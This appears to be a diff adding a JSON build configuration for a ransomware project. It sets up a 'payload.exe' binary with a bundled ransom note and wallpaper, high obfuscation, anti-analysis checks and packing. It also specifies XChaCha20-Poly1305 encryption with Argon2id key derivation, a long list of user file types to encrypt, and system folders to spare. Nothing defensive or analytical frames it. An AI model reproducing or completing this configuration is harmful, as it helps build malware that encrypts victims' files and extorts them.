@@ -1,0 +1,52 @@
+{
+  "source_dir": "src",
+  "output_dir": "dist",
+  "main_executable": "payload.exe",
+  "target_architecture": "x64",
+  "compiler_flags": ["/O2", "/GL", "/MT", "/DNDEBUG"],
+  "linker_flags": ["/SUBSYSTEM:WINDOWS", "/ENTRY:mainCRTStartup", "/LTCG"],
+  
+  "resources": ["ransom_note.txt", "wallpaper.bmp", "config.json"],
+  
+  "obfuscation_level": "high",
+  "enable_anti_analysis": true,
+  "pack_executable": true,
+  
+  "inject_dll": false,
+  "dll_to_inject": "payload.dll",
+  
+  "sign_binary": false,
+  "signing_cert": "cert.pfx",
+  "signing_password": "",
+  
+  "post_build_commands": [
+    "echo Build completed",
+    "dir /b dist"
+  ],
+  
+  "encryption": {
+    "algorithm": "xchacha20poly1305",
+    "key_derivation": "argon2id",
+    "iterations": 10,
+    "memory": 65536,
+    "parallelism": 4
+  },
+  
+  "target_extensions": [
+    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
+    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
+    ".mp3", ".mp4", ".avi", ".mov", ".wav", ".flv",
+    ".zip", ".rar", ".7z", ".tar", ".gz",
+    ".sql", ".db", ".dbf", ".mdb", ".accdb",
+    ".psd", ".ai", ".eps", ".indd", ".dwg", ".dxf"
+  ],
+  
+  "excluded_paths": [
+    "C:\\Windows",
+    "C:\\Program Files",
+    "C:\\Program Files (x86)",
+    "C:\\ProgramData",
+    "C:\\System Volume Information",
+    "C:\\$Recycle.Bin"
+  ]
+}
